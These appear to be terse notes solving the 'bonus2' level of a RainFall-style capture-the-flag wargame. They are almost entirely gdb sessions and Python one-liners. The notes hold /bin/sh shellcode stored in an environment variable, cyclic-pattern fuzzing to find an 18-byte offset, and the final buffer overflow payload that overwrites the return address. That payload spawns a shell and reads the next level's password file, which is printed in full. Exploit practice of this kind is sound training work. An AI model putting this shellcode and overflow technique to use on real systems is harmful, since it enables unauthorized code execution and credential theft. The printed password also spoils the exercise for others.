```
export code="$(python -c 'print("\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")')"
```

```
   (gdb) start
   (gdb) p/x getenv("code")
   $1 = 0xbfffff89
   (gdb) x/s 0xbfffff89
   0xbfffff89:      "1\300\061\333\260\006\315\200Sh/ttyh/dev\211\343\061\311f\271\022'\260\005\315\200\061\300Ph//shh/bin\211\343PS\211\341\231\260\v\315\200"
```

```
    (gdb) run
    Starting program: /home/user/bonus2/bonus2 
    [Inferior 1 (process 4308) exited with code 01]
    (gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
    Starting program: /home/user/bonus2/bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
    Hyvää päivää Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2AAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

    Program received signal SIGSEGV, Segmentation fault.
    0x41366141 in ?? ()
```


```
    (gdb) run $(python -c 'print("A" * 18 + "\x90" * 32 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")') h
    Starting program: /home/user/bonus2/bonus2 $(python -c 'print("A" * 18 + "\x90" * 32 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")') h

    Breakpoint 1, 0x0804852f in main ()
    (gdb) info registers esp
    esp            0xbffff6ec       0xbffff6ec
    (gdb) x/100x $esp
    0xbffff6ec:     0xb7fd0ff4      0x00000000      0x00000000      0x00000000
    0xbffff6fc:     0xb7e454d3      0x00000003      0xbffff794      0xbffff7a4
    0xbffff70c:     0xb7fdc858      0x00000000      0xbffff71c      0xbffff7a4
    0xbffff71c:     0x00000000      0x0804823c      0xb7fd0ff4      0x00000000
    0xbffff72c:     0x00000000      0x00000000      0xcff72b55      0xf8b00f45
    0xbffff73c:     0x00000000      0x00000000      0x00000000      0x00000003
    0xbffff74c:     0x080483d0      0x00000000      0xb7ff26b0      0xb7e453e9
    0xbffff75c:     0xb7ffeff4      0x00000003      0x080483d0      0x00000000
    0xbffff76c:     0x080483f1      0x08048529      0x00000003      0xbffff794
    0xbffff77c:     0x08048640      0x080486b0      0xb7fed280      0xbffff78c
    0xbffff78c:     0xb7fff918      0x00000003      0xbffff8b2      0xbffff8cb
    0xbffff79c:     0xbffff915      0x00000000      0xbffff917      0xbffff927
    0xbffff7ac:     0xbffff93b      0xbffff95c      0xbffff96f      0xbffff97b
    0xbffff7bc:     0xbffffe9c      0xbffffea8      0xbffffef5      0xbfffff0b
    0xbffff7cc:     0xbfffff1a      0xbfffff30      0xbfffff38      0xbfffff41
    0xbffff7dc:     0xbfffff58      0xbfffff60      0xbfffff6f      0xbfffffa1
    0xbffff7ec:     0xbfffffc1      0x00000000      0x00000020      0xb7fdd418
    0xbffff7fc:     0x00000021      0xb7fdd000      0x00000010      0x178bfbff
    0xbffff80c:     0x00000006      0x00001000      0x00000011      0x00000064
    0xbffff81c:     0x00000003      0x08048034      0x00000004      0x00000020
    0xbffff82c:     0x00000005      0x00000008      0x00000007      0xb7fde000
    0xbffff83c:     0x00000008      0x00000000      0x00000009      0x080483d0
    0xbffff84c:     0x0000000b      0x000007dc      0x0000000c      0x000007dc
    0xbffff85c:     0x0000000d      0x000007dc      0x0000000e      0x000007dc
    0xbffff86c:     0x00000017      0x00000000      0x00000019      0xbffff89b
```

export LANG=fi

$(python -c "print("A" * 18 + [ Return Address (4 bytes) ] [ Shellcode )")

$(python -c 'print("A" * 18 + "\x10\xf5\xff\xbf" + "\x90" * 32 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')



$(python -c 'print("A" * 18 + "\x90" * 32 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")') h


$(python -c 'print("A" * 18 + "\x89\xff\xff\xbf")') h

$(python -c 'print("A" * 100)') h

```
    (gdb) run hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
    Starting program: /home/user/bonus2/bonus2 hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
    Hyvää päivää hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

    Program received signal SIGSEGV, Segmentation fault.
    0x41366141 in ?? ()
```

the offset is 18

hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh $(python -c 'print("A" * 18 + "\x89\xff\xff\xbf")')

```
    bonus2@RainFall:~$ ./bonus2 hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh $(python -c 'print("A" * 18 + "\x89\xff\xff\xbf")')
    Hyvää päivää hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhAAAAAAAAAAAAAAAAAA����
    $ cat /home/user/bonus3/.pass
    71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```